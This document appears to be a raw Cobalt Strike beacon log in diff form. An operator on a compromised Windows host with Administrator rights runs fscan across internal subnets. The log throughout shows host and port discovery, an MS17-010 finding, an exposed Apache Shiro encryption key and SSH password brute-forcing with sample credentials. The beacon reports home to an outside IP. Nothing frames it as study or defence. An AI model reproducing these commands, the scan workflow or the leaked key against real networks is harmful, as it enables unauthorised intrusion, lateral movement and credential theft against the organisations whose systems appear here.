@@ -1,0 +1,2152 @@
+12/08 11:25:33 UTC [metadata] 222.91.146.58 <- 172.17.104.14; computer: WIN-A694SCMAFA1; user: Administrator *; process: beacon.exe; pid: 15044; os: Windows; version: 6.1; build: 7601; beacon arch: x86 (x64)
+12/08 11:36:33 UTC [input] <dog> sleep 1
+12/08 11:36:33 UTC [task] <T1029> Tasked beacon to sleep for 1s
+12/08 11:37:27 UTC [checkin] host called home, sent: 16 bytes
+12/08 11:41:59 UTC [checkin] host called home, sent: 19 bytes
+12/08 11:42:07 UTC [checkin] host called home, sent: 20 bytes
+12/08 11:42:13 UTC [input] <dog> execute D:\fscan1.8.exe
+12/08 11:42:13 UTC [task] <T1106> Tasked beacon to execute: D:\fscan1.8.exe
+12/08 11:42:14 UTC [checkin] host called home, sent: 23 bytes
+12/08 11:42:35 UTC [input] <dog> shell D:\fscan1.8.exe -h 172.17.104.1/24 -pa 3389
+12/08 11:42:35 UTC [task] <T1059> Tasked beacon to run: D:\fscan1.8.exe -h 172.17.104.1/24 -pa 3389
+12/08 11:42:35 UTC [task] <> Hello,Dog cs.
+12/08 11:42:36 UTC [checkin] host called home, sent: 74 bytes
+12/08 11:42:46 UTC [output]
+received output:
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.0
+start infoscan
+(icmp) Target 172.17.104.14   is alive
+(icmp) Target 172.17.104.1    is alive
+(icmp) Target 172.17.104.15   is alive
+(icmp) Target 172.17.104.52   is alive
+(icmp) Target 172.17.104.49   is alive
+(icmp) Target 172.17.104.94   is alive
+(icmp) Target 172.17.104.100  is alive
+(icmp) Target 172.17.104.126  is alive
+(icmp) Target 172.17.104.152  is alive
+(icmp) Target 172.17.104.182  is alive
+(icmp) Target 172.17.104.223  is alive
+[*] Icmp alive hosts len is: 11
+172.17.104.14:139 open
+172.17.104.14:3306 open
+172.17.104.94:22 open
+172.17.104.52:135 open
+172.17.104.52:80 open
+172.17.104.14:135 open
+172.17.104.15:80 open
+172.17.104.14:80 open
+172.17.104.15:6379 open
+172.17.104.15:90 open
+172.17.104.52:443 open
+172.17.104.14:1433 open
+172.17.104.15:443 open
+172.17.104.182:445 open
+172.17.104.52:445 open
+172.17.104.52:139 open
+172.17.104.182:139 open
+172.17.104.14:445 open
+172.17.104.182:135 open
+172.17.104.14:8080 open
+172.17.104.94:443 open
+172.17.104.1:80 open
+172.17.104.1:443 open
+172.17.104.182:7680 open
+172.17.104.14:8009 open
+172.17.104.52:8086 open
+172.17.104.14:8090 open
+172.17.104.14:9080 open
+172.17.104.15:9090 open
+172.17.104.15:10002 open
+
+
+12/08 11:42:49 UTC [output]
+received output:
+[*] alive ports len is: 30
+start vulscan
+[+] 172.17.104.52	MS17-010	(Windows Server 2016 Datacenter 14393)
+[*] WebTitle:http://172.17.104.15:9090 code:200 len:29528  title:  
+[*] 172.17.104.52        WORKGROUP\WIN-7F7M8GHRP5F   Windows Server 2016 Datacenter 14393
+[+] NetInfo:
+[*]172.17.104.182
+   [->]DESKTOP-A9CKCS4
+   [->]172.17.104.182
+[*] WebTitle:http://172.17.104.15:90   code:403 len:212    title:403 Forbidden
+[*] WebTitle:http://172.17.104.15      code:200 len:29528  title:  
+[+] NetInfo:
+[*]172.17.104.52
+   [->]WIN-7F7M8GHRP5F
+   [->]172.17.104.52
+   [->]2001:0:348b:fb58:487:55d:53ee:97cb
+[*] 172.17.104.182       WORKGROUP\DESKTOP-A9CKCS4   
+[*] WebTitle:http://172.17.104.52      code:200 len:703    title:IIS Windows Server
+[*] 172.17.104.14  (Windows Server 2008 R2 Standard 7601 Service Pack 1)
+[*] 172.17.104.14        WORKGROUP\WIN-A694SCMAFA1   Windows Server 2008 R2 Standard 7601 Service Pack 1
+[+] NetInfo:
+[*]172.17.104.14
+   [->]WIN-A694SCMAFA1
+   [->]172.17.104.14
+[*] WebTitle:http://172.17.104.14:8080 code:200 len:368    title:None
+[*] WebTitle:http://172.17.104.1       code:400 len:0      title:None
+[*] WebTitle:https://172.17.104.15     code:200 len:29528  title:  
+[*] WebTitle:http://172.17.104.14      code:302 len:116    title:瀵硅薄宸茬Щ鍔� 璺宠浆url: http://172.17.104.14/qpoaweb/login.aspx
+[*] WebTitle:http://172.17.104.52:8086 code:200 len:16667  title:None
+[*] WebTitle:http://172.17.104.14:9080 code:200 len:9680   title:鏅鸿兘鏂囦欢娴佽浆鏌滅鐞嗗钩鍙�
+[*] WebTitle:http://172.17.104.14:8090 code:200 len:9719   title:Office Anywhere 2017鐗� 缃戠粶鏅鸿兘鍔炲叕绯荤粺
+[*] WebTitle:https://172.17.104.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.104.1      code:400 len:0      title:None
+[+] InfoScan:http://172.17.104.14:8090 [閫氳揪OA] 
+
+
+12/08 11:42:55 UTC [output]
+received output:
+[+] http://172.17.104.14:9080/ poc-yaml-shiro-key [{key 4AvVhmFLUs0KTA3Kprsdag==} {mode cbc}]
+
+
+12/08 11:43:57 UTC [output]
+received output:
+宸插畬鎴� 27/30 [-] ssh 172.17.104.94:22 root test ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 11:44:58 UTC [output]
+received output:
+宸插畬鎴� 29/30 [-] ssh 172.17.104.94:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 11:45:59 UTC [output]
+received output:
+宸插畬鎴� 29/30 [-] ssh 172.17.104.94:22 admin admin111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 11:47:00 UTC [output]
+received output:
+宸插畬鎴� 29/30 [-] ssh 172.17.104.94:22 admin 1qaz@WSX ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 11:47:41 UTC [output]
+received output:
+宸插畬鎴� 30/30
+[*] 鎵弿缁撴潫,鑰楁椂: 5m3.321349s
+
+12/08 12:01:52 UTC [input] <dog> shell D:\fscan1.8.exe -h 172.17.103.1/24 -pa 3389
+12/08 12:01:52 UTC [task] <T1059> Tasked beacon to run: D:\fscan1.8.exe -h 172.17.103.1/24 -pa 3389
+12/08 12:01:52 UTC [task] <> Hello,Dog cs.
+12/08 12:01:52 UTC [checkin] host called home, sent: 74 bytes
+12/08 12:02:02 UTC [output]
+received output:
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.0
+start infoscan
+(icmp) Target 172.17.103.2    is alive
+(icmp) Target 172.17.103.170  is alive
+(icmp) Target 172.17.103.192  is alive
+(icmp) Target 172.17.103.242  is alive
+(icmp) Target 172.17.103.1    is alive
+[*] Icmp alive hosts len is: 5
+172.17.103.1:80 open
+172.17.103.1:443 open
+[*] alive ports len is: 2
+start vulscan
+[*] WebTitle:http://172.17.103.1       code:400 len:0      title:None
+[*] WebTitle:https://172.17.103.1      code:400 len:0      title:None
+[*] WebTitle:https://172.17.103.1      code:400 len:0      title:None
+
+
+12/08 12:03:47 UTC [output]
+received output:
+宸插畬鎴� 2/2
+[*] 鎵弿缁撴潫,鑰楁椂: 1m54.3165385s
+
+12/08 12:04:08 UTC [input] <dog> shell D:\fscan1.8.exe -h 172.17.103.1/16 -pa 3389
+12/08 12:04:08 UTC [task] <T1059> Tasked beacon to run: D:\fscan1.8.exe -h 172.17.103.1/16 -pa 3389
+12/08 12:04:08 UTC [task] <> Hello,Dog cs.
+12/08 12:04:08 UTC [checkin] host called home, sent: 74 bytes
+12/08 12:04:18 UTC [output]
+received output:
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.0
+start infoscan
+
+
+12/08 12:04:30 UTC [output]
+received output:
+(icmp) Target 172.17.100.2    is alive
+(icmp) Target 172.17.100.1    is alive
+(icmp) Target 172.17.101.1    is alive
+(icmp) Target 172.17.101.3    is alive
+(icmp) Target 172.17.101.13   is alive
+(icmp) Target 172.17.101.18   is alive
+(icmp) Target 172.17.101.2    is alive
+(icmp) Target 172.17.102.2    is alive
+(icmp) Target 172.17.102.1    is alive
+(icmp) Target 172.17.102.3    is alive
+(icmp) Target 172.17.102.4    is alive
+(icmp) Target 172.17.102.8    is alive
+(icmp) Target 172.17.102.9    is alive
+(icmp) Target 172.17.102.14   is alive
+(icmp) Target 172.17.102.15   is alive
+(icmp) Target 172.17.102.16   is alive
+(icmp) Target 172.17.102.18   is alive
+(icmp) Target 172.17.102.27   is alive
+(icmp) Target 172.17.102.28   is alive
+(icmp) Target 172.17.102.40   is alive
+(icmp) Target 172.17.102.43   is alive
+(icmp) Target 172.17.102.54   is alive
+(icmp) Target 172.17.102.55   is alive
+(icmp) Target 172.17.102.59   is alive
+(icmp) Target 172.17.102.94   is alive
+(icmp) Target 172.17.102.96   is alive
+(icmp) Target 172.17.102.108  is alive
+(icmp) Target 172.17.102.113  is alive
+(icmp) Target 172.17.101.16   is alive
+(icmp) Target 172.17.101.15   is alive
+(icmp) Target 172.17.101.20   is alive
+(icmp) Target 172.17.101.4    is alive
+(icmp) Target 172.17.101.23   is alive
+(icmp) Target 172.17.101.7    is alive
+(icmp) Target 172.17.101.14   is alive
+(icmp) Target 172.17.101.21   is alive
+(icmp) Target 172.17.101.11   is alive
+(icmp) Target 172.17.101.17   is alive
+(icmp) Target 172.17.101.10   is alive
+(icmp) Target 172.17.101.8    is alive
+(icmp) Target 172.17.101.19   is alive
+(icmp) Target 172.17.102.125  is alive
+(icmp) Target 172.17.102.128  is alive
+(icmp) Target 172.17.102.134  is alive
+(icmp) Target 172.17.102.137  is alive
+(icmp) Target 172.17.102.140  is alive
+(icmp) Target 172.17.102.142  is alive
+(icmp) Target 172.17.102.146  is alive
+(icmp) Target 172.17.102.148  is alive
+(icmp) Target 172.17.101.22   is alive
+(icmp) Target 172.17.101.12   is alive
+(icmp) Target 172.17.101.9    is alive
+(icmp) Target 172.17.101.6    is alive
+(icmp) Target 172.17.102.157  is alive
+(icmp) Target 172.17.102.161  is alive
+(icmp) Target 172.17.102.164  is alive
+(icmp) Target 172.17.102.165  is alive
+(icmp) Target 172.17.102.171  is alive
+(icmp) Target 172.17.102.172  is alive
+(icmp) Target 172.17.102.179  is alive
+(icmp) Target 172.17.102.181  is alive
+(icmp) Target 172.17.102.192  is alive
+(icmp) Target 172.17.102.193  is alive
+(icmp) Target 172.17.102.200  is alive
+
+
+12/08 12:04:31 UTC [output]
+received output:
+(icmp) Target 172.17.102.202  is alive
+(icmp) Target 172.17.102.201  is alive
+(icmp) Target 172.17.102.205  is alive
+(icmp) Target 172.17.102.206  is alive
+(icmp) Target 172.17.102.207  is alive
+(icmp) Target 172.17.102.213  is alive
+(icmp) Target 172.17.102.214  is alive
+(icmp) Target 172.17.102.220  is alive
+(icmp) Target 172.17.102.224  is alive
+(icmp) Target 172.17.102.228  is alive
+(icmp) Target 172.17.102.246  is alive
+(icmp) Target 172.17.102.253  is alive
+(icmp) Target 172.17.103.1    is alive
+(icmp) Target 172.17.103.2    is alive
+(icmp) Target 172.17.103.170  is alive
+(icmp) Target 172.17.103.192  is alive
+(icmp) Target 172.17.103.214  is alive
+(icmp) Target 172.17.103.242  is alive
+(icmp) Target 172.17.104.1    is alive
+(icmp) Target 172.17.104.14   is alive
+(icmp) Target 172.17.104.15   is alive
+(icmp) Target 172.17.104.49   is alive
+(icmp) Target 172.17.104.52   is alive
+(icmp) Target 172.17.104.94   is alive
+(icmp) Target 172.17.104.100  is alive
+(icmp) Target 172.17.104.126  is alive
+(icmp) Target 172.17.104.152  is alive
+(icmp) Target 172.17.104.182  is alive
+
+
+12/08 12:04:32 UTC [output]
+received output:
+(icmp) Target 172.17.104.223  is alive
+(icmp) Target 172.17.105.1    is alive
+(icmp) Target 172.17.105.44   is alive
+(icmp) Target 172.17.105.50   is alive
+(icmp) Target 172.17.105.129  is alive
+(icmp) Target 172.17.105.133  is alive
+(icmp) Target 172.17.105.135  is alive
+(icmp) Target 172.17.105.152  is alive
+(icmp) Target 172.17.105.222  is alive
+(icmp) Target 172.17.105.236  is alive
+(icmp) Target 172.17.105.246  is alive
+(icmp) Target 172.17.105.249  is alive
+(icmp) Target 172.17.105.250  is alive
+(icmp) Target 172.17.106.1    is alive
+(icmp) Target 172.17.106.17   is alive
+(icmp) Target 172.17.106.18   is alive
+(icmp) Target 172.17.106.40   is alive
+(icmp) Target 172.17.106.51   is alive
+(icmp) Target 172.17.106.54   is alive
+(icmp) Target 172.17.106.59   is alive
+(icmp) Target 172.17.106.77   is alive
+(icmp) Target 172.17.106.117  is alive
+(icmp) Target 172.17.106.137  is alive
+(icmp) Target 172.17.106.165  is alive
+(icmp) Target 172.17.106.208  is alive
+(icmp) Target 172.17.106.210  is alive
+(icmp) Target 172.17.107.1    is alive
+(icmp) Target 172.17.107.32   is alive
+(icmp) Target 172.17.107.50   is alive
+(icmp) Target 172.17.107.54   is alive
+
+
+12/08 12:04:33 UTC [output]
+received output:
+(icmp) Target 172.17.107.79   is alive
+(icmp) Target 172.17.107.97   is alive
+(icmp) Target 172.17.107.164  is alive
+(icmp) Target 172.17.107.173  is alive
+(icmp) Target 172.17.107.176  is alive
+(icmp) Target 172.17.107.182  is alive
+(icmp) Target 172.17.107.185  is alive
+(icmp) Target 172.17.107.195  is alive
+(icmp) Target 172.17.107.201  is alive
+(icmp) Target 172.17.107.220  is alive
+(icmp) Target 172.17.108.1    is alive
+(icmp) Target 172.17.108.10   is alive
+(icmp) Target 172.17.108.12   is alive
+(icmp) Target 172.17.108.25   is alive
+(icmp) Target 172.17.108.28   is alive
+(icmp) Target 172.17.108.31   is alive
+(icmp) Target 172.17.108.37   is alive
+(icmp) Target 172.17.108.39   is alive
+(icmp) Target 172.17.108.41   is alive
+(icmp) Target 172.17.108.61   is alive
+(icmp) Target 172.17.108.82   is alive
+(icmp) Target 172.17.108.86   is alive
+(icmp) Target 172.17.108.97   is alive
+(icmp) Target 172.17.108.107  is alive
+(icmp) Target 172.17.108.137  is alive
+(icmp) Target 172.17.108.154  is alive
+(icmp) Target 172.17.108.194  is alive
+(icmp) Target 172.17.108.201  is alive
+(icmp) Target 172.17.108.202  is alive
+(icmp) Target 172.17.108.203  is alive
+(icmp) Target 172.17.108.208  is alive
+(icmp) Target 172.17.108.214  is alive
+(icmp) Target 172.17.108.216  is alive
+(icmp) Target 172.17.108.218  is alive
+(icmp) Target 172.17.108.219  is alive
+(icmp) Target 172.17.108.220  is alive
+(icmp) Target 172.17.108.228  is alive
+(icmp) Target 172.17.108.249  is alive
+(icmp) Target 172.17.108.254  is alive
+(icmp) Target 172.17.109.1    is alive
+(icmp) Target 172.17.109.2    is alive
+(icmp) Target 172.17.109.4    is alive
+(icmp) Target 172.17.109.10   is alive
+(icmp) Target 172.17.109.16   is alive
+(icmp) Target 172.17.109.18   is alive
+(icmp) Target 172.17.109.24   is alive
+(icmp) Target 172.17.109.30   is alive
+(icmp) Target 172.17.109.34   is alive
+(icmp) Target 172.17.109.36   is alive
+(icmp) Target 172.17.109.40   is alive
+(icmp) Target 172.17.109.41   is alive
+(icmp) Target 172.17.109.51   is alive
+(icmp) Target 172.17.109.55   is alive
+(icmp) Target 172.17.109.56   is alive
+(icmp) Target 172.17.109.58   is alive
+(icmp) Target 172.17.109.59   is alive
+(icmp) Target 172.17.109.60   is alive
+(icmp) Target 172.17.109.62   is alive
+(icmp) Target 172.17.109.65   is alive
+(icmp) Target 172.17.109.84   is alive
+(icmp) Target 172.17.109.87   is alive
+(icmp) Target 172.17.109.99   is alive
+(icmp) Target 172.17.109.103  is alive
+(icmp) Target 172.17.109.104  is alive
+(icmp) Target 172.17.109.106  is alive
+(icmp) Target 172.17.109.107  is alive
+(icmp) Target 172.17.109.110  is alive
+(icmp) Target 172.17.109.114  is alive
+(icmp) Target 172.17.109.115  is alive
+(icmp) Target 172.17.109.118  is alive
+(icmp) Target 172.17.109.119  is alive
+(icmp) Target 172.17.109.128  is alive
+(icmp) Target 172.17.109.129  is alive
+(icmp) Target 172.17.109.130  is alive
+(icmp) Target 172.17.109.132  is alive
+(icmp) Target 172.17.109.134  is alive
+(icmp) Target 172.17.109.138  is alive
+(icmp) Target 172.17.109.139  is alive
+(icmp) Target 172.17.109.142  is alive
+(icmp) Target 172.17.109.144  is alive
+(icmp) Target 172.17.109.147  is alive
+(icmp) Target 172.17.109.148  is alive
+(icmp) Target 172.17.109.150  is alive
+(icmp) Target 172.17.109.154  is alive
+(icmp) Target 172.17.109.156  is alive
+(icmp) Target 172.17.109.158  is alive
+(icmp) Target 172.17.109.160  is alive
+(icmp) Target 172.17.109.165  is alive
+(icmp) Target 172.17.109.170  is alive
+(icmp) Target 172.17.109.171  is alive
+(icmp) Target 172.17.109.174  is alive
+(icmp) Target 172.17.109.175  is alive
+(icmp) Target 172.17.109.176  is alive
+(icmp) Target 172.17.109.178  is alive
+(icmp) Target 172.17.109.179  is alive
+(icmp) Target 172.17.109.188  is alive
+(icmp) Target 172.17.109.189  is alive
+(icmp) Target 172.17.109.192  is alive
+(icmp) Target 172.17.109.193  is alive
+(icmp) Target 172.17.109.195  is alive
+(icmp) Target 172.17.109.203  is alive
+(icmp) Target 172.17.109.206  is alive
+(icmp) Target 172.17.109.208  is alive
+(icmp) Target 172.17.109.210  is alive
+(icmp) Target 172.17.109.212  is alive
+(icmp) Target 172.17.109.215  is alive
+(icmp) Target 172.17.109.220  is alive
+(icmp) Target 172.17.109.223  is alive
+(icmp) Target 172.17.109.224  is alive
+(icmp) Target 172.17.109.226  is alive
+(icmp) Target 172.17.109.227  is alive
+(icmp) Target 172.17.109.230  is alive
+(icmp) Target 172.17.109.236  is alive
+(icmp) Target 172.17.109.240  is alive
+(icmp) Target 172.17.109.244  is alive
+(icmp) Target 172.17.109.246  is alive
+(icmp) Target 172.17.109.249  is alive
+(icmp) Target 172.17.109.254  is alive
+(icmp) Target 172.17.110.1    is alive
+(icmp) Target 172.17.110.8    is alive
+(icmp) Target 172.17.110.15   is alive
+(icmp) Target 172.17.110.13   is alive
+(icmp) Target 172.17.110.76   is alive
+(icmp) Target 172.17.110.117  is alive
+(icmp) Target 172.17.110.154  is alive
+(icmp) Target 172.17.110.116  is alive
+(icmp) Target 172.17.110.208  is alive
+(icmp) Target 172.17.110.229  is alive
+(icmp) Target 172.17.110.251  is alive
+(icmp) Target 172.17.110.252  is alive
+(icmp) Target 172.17.110.253  is alive
+(icmp) Target 172.17.110.160  is alive
+(icmp) Target 172.17.110.53   is alive
+(icmp) Target 172.17.110.88   is alive
+
+
+12/08 12:05:15 UTC [output]
+received output:
+[*] LiveTop 172.17.0.0/16    娈靛瓨娲绘暟閲忎负: 256
+[*] LiveTop 172.17.109.0/24  娈靛瓨娲绘暟閲忎负: 79
+[*] LiveTop 172.17.102.0/24  娈靛瓨娲绘暟閲忎负: 52
+[*] LiveTop 172.17.108.0/24  娈靛瓨娲绘暟閲忎负: 29
+[*] LiveTop 172.17.101.0/24  娈靛瓨娲绘暟閲忎负: 22
+[*] LiveTop 172.17.110.0/24  娈靛瓨娲绘暟閲忎负: 16
+[*] LiveTop 172.17.107.0/24  娈靛瓨娲绘暟閲忎负: 14
+[*] LiveTop 172.17.106.0/24  娈靛瓨娲绘暟閲忎负: 13
+[*] LiveTop 172.17.105.0/24  娈靛瓨娲绘暟閲忎负: 12
+[*] LiveTop 172.17.104.0/24  娈靛瓨娲绘暟閲忎负: 11
+[*] LiveTop 172.17.103.0/24  娈靛瓨娲绘暟閲忎负: 6
+[*] Icmp alive hosts len is: 256
+172.17.109.4:22 open
+172.17.109.34:22 open
+172.17.109.56:22 open
+172.17.109.65:22 open
+172.17.109.18:22 open
+172.17.109.51:22 open
+172.17.109.103:22 open
+172.17.109.2:22 open
+172.17.109.40:22 open
+172.17.109.87:22 open
+172.17.109.30:22 open
+172.17.109.36:22 open
+172.17.109.62:22 open
+172.17.109.24:22 open
+172.17.109.41:22 open
+172.17.109.84:22 open
+172.17.109.10:22 open
+172.17.102.206:22 open
+172.17.109.59:22 open
+172.17.110.253:21 open
+172.17.102.205:22 open
+172.17.109.60:22 open
+172.17.109.16:22 open
+172.17.102.8:22 open
+172.17.109.58:22 open
+172.17.102.2:22 open
+172.17.109.106:22 open
+172.17.102.4:22 open
+172.17.109.114:22 open
+172.17.108.10:22 open
+172.17.102.3:22 open
+172.17.109.110:22 open
+172.17.109.115:22 open
+172.17.104.52:80 open
+172.17.109.99:22 open
+172.17.104.15:80 open
+172.17.109.107:22 open
+172.17.104.14:80 open
+172.17.108.220:21 open
+172.17.109.104:22 open
+172.17.108.219:21 open
+172.17.104.94:22 open
+172.17.109.132:22 open
+172.17.109.128:22 open
+172.17.102.9:80 open
+172.17.109.129:22 open
+172.17.109.144:22 open
+172.17.109.142:22 open
+172.17.102.3:80 open
+172.17.102.4:80 open
+172.17.109.130:22 open
+172.17.109.154:22 open
+172.17.109.156:22 open
+172.17.109.246:22 open
+172.17.109.150:22 open
+172.17.109.138:22 open
+172.17.109.148:22 open
+172.17.109.147:22 open
+172.17.109.55:22 open
+172.17.109.160:22 open
+172.17.109.249:22 open
+172.17.102.2:80 open
+172.17.109.244:22 open
+172.17.109.240:22 open
+172.17.109.165:22 open
+172.17.102.8:80 open
+172.17.109.158:22 open
+172.17.109.171:22 open
+172.17.109.254:22 open
+172.17.109.170:22 open
+172.17.109.176:22 open
+172.17.109.175:22 open
+172.17.109.178:22 open
+172.17.109.189:22 open
+172.17.109.188:22 open
+172.17.109.226:22 open
+172.17.109.215:22 open
+172.17.109.179:22 open
+172.17.109.223:22 open
+172.17.109.192:22 open
+172.17.109.208:22 open
+172.17.109.220:22 open
+172.17.109.210:22 open
+172.17.109.174:22 open
+172.17.109.203:22 open
+172.17.109.227:22 open
+172.17.109.224:22 open
+172.17.109.212:22 open
+172.17.109.193:22 open
+172.17.109.230:22 open
+172.17.109.206:22 open
+172.17.101.8:80 open
+172.17.101.6:80 open
+172.17.101.17:80 open
+172.17.101.4:80 open
+172.17.101.20:80 open
+172.17.101.9:80 open
+172.17.101.15:80 open
+172.17.101.10:80 open
+172.17.101.19:80 open
+172.17.101.21:80 open
+172.17.101.7:80 open
+172.17.101.14:80 open
+172.17.101.12:80 open
+172.17.101.22:80 open
+172.17.101.13:80 open
+172.17.101.23:80 open
+172.17.101.2:80 open
+172.17.101.18:80 open
+172.17.101.16:80 open
+172.17.101.3:80 open
+172.17.108.12:80 open
+172.17.108.31:80 open
+172.17.108.25:80 open
+172.17.108.86:80 open
+172.17.108.154:80 open
+172.17.108.137:80 open
+172.17.108.202:80 open
+172.17.108.201:80 open
+172.17.108.208:80 open
+172.17.108.214:80 open
+172.17.108.218:80 open
+172.17.108.219:80 open
+172.17.108.220:80 open
+172.17.109.10:80 open
+172.17.109.30:80 open
+172.17.109.36:80 open
+172.17.109.16:80 open
+172.17.109.55:80 open
+172.17.109.34:80 open
+172.17.109.40:80 open
+172.17.109.59:80 open
+172.17.109.58:80 open
+172.17.109.60:80 open
+172.17.109.65:80 open
+172.17.109.103:80 open
+172.17.109.104:80 open
+172.17.109.106:80 open
+172.17.109.110:80 open
+172.17.109.107:80 open
+172.17.109.115:80 open
+172.17.109.114:80 open
+172.17.109.128:80 open
+172.17.109.129:80 open
+172.17.109.132:80 open
+172.17.109.99:80 open
+172.17.109.147:80 open
+172.17.109.150:80 open
+172.17.109.154:80 open
+172.17.109.156:80 open
+172.17.109.171:80 open
+172.17.109.174:80 open
+172.17.101.11:80 open
+172.17.109.179:80 open
+172.17.109.178:80 open
+172.17.109.189:80 open
+172.17.109.193:80 open
+172.17.109.206:80 open
+172.17.109.212:80 open
+172.17.109.220:80 open
+172.17.109.224:80 open
+172.17.109.227:80 open
+172.17.109.230:80 open
+172.17.109.223:80 open
+172.17.109.226:80 open
+172.17.109.240:80 open
+172.17.109.244:80 open
+172.17.109.254:80 open
+172.17.109.144:80 open
+172.17.109.4:80 open
+172.17.109.51:80 open
+172.17.109.87:80 open
+172.17.109.62:80 open
+172.17.109.56:80 open
+172.17.109.41:80 open
+172.17.109.84:80 open
+172.17.109.18:80 open
+172.17.109.130:80 open
+172.17.109.2:80 open
+172.17.109.165:80 open
+172.17.109.142:80 open
+172.17.109.246:80 open
+172.17.109.170:80 open
+172.17.109.188:80 open
+172.17.109.175:80 open
+172.17.109.158:80 open
+172.17.109.215:80 open
+172.17.109.192:80 open
+172.17.109.210:80 open
+172.17.109.24:80 open
+172.17.109.203:80 open
+172.17.109.249:80 open
+172.17.103.1:80 open
+172.17.104.1:80 open
+172.17.109.160:80 open
+172.17.109.138:80 open
+172.17.109.148:80 open
+172.17.102.1:80 open
+172.17.100.1:80 open
+172.17.101.1:80 open
+172.17.105.1:80 open
+172.17.109.119:22 open
+172.17.106.1:80 open
+172.17.109.118:22 open
+172.17.107.1:80 open
+172.17.109.119:80 open
+172.17.108.1:80 open
+172.17.109.118:80 open
+172.17.109.176:80 open
+172.17.109.1:80 open
+172.17.110.1:80 open
+172.17.109.134:22 open
+172.17.109.134:80 open
+172.17.109.236:22 open
+172.17.109.236:80 open
+172.17.109.195:22 open
+172.17.109.195:80 open
+172.17.109.208:80 open
+172.17.102.28:135 open
+172.17.102.27:135 open
+172.17.102.15:135 open
+172.17.102.59:135 open
+172.17.102.40:135 open
+172.17.102.16:135 open
+172.17.102.18:135 open
+172.17.102.14:135 open
+172.17.102.55:135 open
+172.17.102.54:135 open
+172.17.102.94:135 open
+172.17.102.96:135 open
+172.17.102.113:135 open
+172.17.102.108:135 open
+172.17.102.128:135 open
+172.17.102.134:135 open
+172.17.102.137:135 open
+172.17.102.43:135 open
+172.17.102.142:135 open
+172.17.102.140:135 open
+172.17.102.146:135 open
+172.17.102.148:135 open
+172.17.102.161:135 open
+172.17.102.164:135 open
+
+
+12/08 12:05:16 UTC [output]
+received output:
+172.17.102.165:135 open
+172.17.102.171:135 open
+172.17.102.172:135 open
+172.17.102.179:135 open
+172.17.102.157:135 open
+172.17.102.181:135 open
+172.17.102.192:135 open
+172.17.102.193:135 open
+172.17.102.125:135 open
+172.17.102.200:135 open
+172.17.102.202:135 open
+172.17.102.201:135 open
+172.17.102.207:135 open
+172.17.102.213:135 open
+172.17.102.220:135 open
+172.17.102.214:135 open
+172.17.102.224:135 open
+172.17.102.228:135 open
+172.17.102.253:135 open
+172.17.102.246:135 open
+172.17.104.14:135 open
+172.17.104.52:135 open
+172.17.104.182:135 open
+172.17.105.250:135 open
+172.17.108.82:135 open
+172.17.108.203:135 open
+172.17.110.253:135 open
+172.17.110.208:135 open
+172.17.102.2:139 open
+172.17.102.8:139 open
+172.17.102.14:139 open
+172.17.102.15:139 open
+172.17.102.16:139 open
+172.17.102.18:139 open
+172.17.102.27:139 open
+172.17.102.28:139 open
+172.17.102.40:139 open
+172.17.102.43:139 open
+172.17.102.55:139 open
+172.17.102.59:139 open
+172.17.102.94:139 open
+172.17.102.96:139 open
+172.17.102.108:139 open
+172.17.102.113:139 open
+172.17.102.54:139 open
+172.17.102.128:139 open
+172.17.102.134:139 open
+172.17.102.137:139 open
+172.17.102.140:139 open
+172.17.102.142:139 open
+172.17.102.146:139 open
+172.17.102.148:139 open
+172.17.102.125:139 open
+172.17.102.161:139 open
+172.17.102.164:139 open
+172.17.102.165:139 open
+172.17.102.171:139 open
+172.17.102.172:139 open
+172.17.102.179:139 open
+172.17.102.181:139 open
+172.17.102.192:139 open
+172.17.102.193:139 open
+172.17.102.200:139 open
+172.17.102.202:139 open
+172.17.102.201:139 open
+172.17.102.157:139 open
+172.17.102.207:139 open
+172.17.102.213:139 open
+172.17.102.214:139 open
+172.17.102.220:139 open
+172.17.102.224:139 open
+172.17.102.228:139 open
+172.17.102.246:139 open
+172.17.102.253:139 open
+172.17.104.14:139 open
+172.17.104.52:139 open
+172.17.103.214:139 open
+172.17.105.50:139 open
+172.17.105.44:139 open
+172.17.104.182:139 open
+172.17.105.129:139 open
+172.17.105.133:139 open
+172.17.105.135:139 open
+172.17.105.250:139 open
+172.17.106.54:139 open
+172.17.107.97:139 open
+172.17.108.82:139 open
+172.17.108.39:139 open
+172.17.108.107:139 open
+172.17.108.203:139 open
+172.17.108.249:139 open
+172.17.110.253:139 open
+172.17.102.2:443 open
+172.17.102.3:443 open
+172.17.102.4:443 open
+172.17.102.8:443 open
+172.17.102.9:443 open
+172.17.110.208:139 open
+172.17.101.2:443 open
+172.17.101.13:443 open
+172.17.101.18:443 open
+172.17.101.3:443 open
+172.17.101.16:443 open
+172.17.101.20:443 open
+172.17.101.15:443 open
+172.17.101.23:443 open
+172.17.101.4:443 open
+172.17.101.14:443 open
+172.17.101.7:443 open
+172.17.101.21:443 open
+172.17.101.11:443 open
+172.17.101.17:443 open
+172.17.101.19:443 open
+172.17.101.8:443 open
+172.17.101.10:443 open
+172.17.101.12:443 open
+172.17.101.6:443 open
+172.17.101.9:443 open
+172.17.101.22:443 open
+172.17.104.15:443 open
+172.17.104.52:443 open
+172.17.104.94:443 open
+172.17.100.1:443 open
+172.17.101.1:443 open
+172.17.102.1:443 open
+172.17.103.1:443 open
+172.17.104.1:443 open
+172.17.105.1:443 open
